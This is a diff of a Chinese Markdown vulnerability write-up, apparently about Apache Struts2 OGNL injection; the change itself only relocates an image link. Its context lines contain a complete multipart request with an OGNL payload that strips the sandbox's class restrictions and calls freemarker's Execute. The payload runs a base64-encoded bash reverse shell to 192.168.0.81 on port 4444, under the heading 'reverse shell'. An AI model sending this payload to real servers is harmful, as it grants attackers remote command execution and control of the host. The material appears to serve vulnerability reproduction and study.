@@ -98,6 +98,9 @@ Content-Disposition: form-data; name="id"
 
 ```
 
+![20201213132730](https://raw.githubusercontent.com/Hatcat123/GraphicBed/master/Img2/20201213132730.png)
+
+
 
 **反弹shell**
 ```
@@ -121,9 +124,6 @@ Content-Disposition: form-data; name="id"
 %{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuODEvNDQ0NCAgMD4mMQ==}|{base64,-d}|{bash,-i}")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}
 ------WebKitFormBoundaryl7d1B1aGsV2wcZwF--
 ```
-
-![20201213132730](https://raw.githubusercontent.com/Hatcat123/GraphicBed/master/Img2/20201213132730.png)
-
 
 
 如果不能返回，可以使用base64下
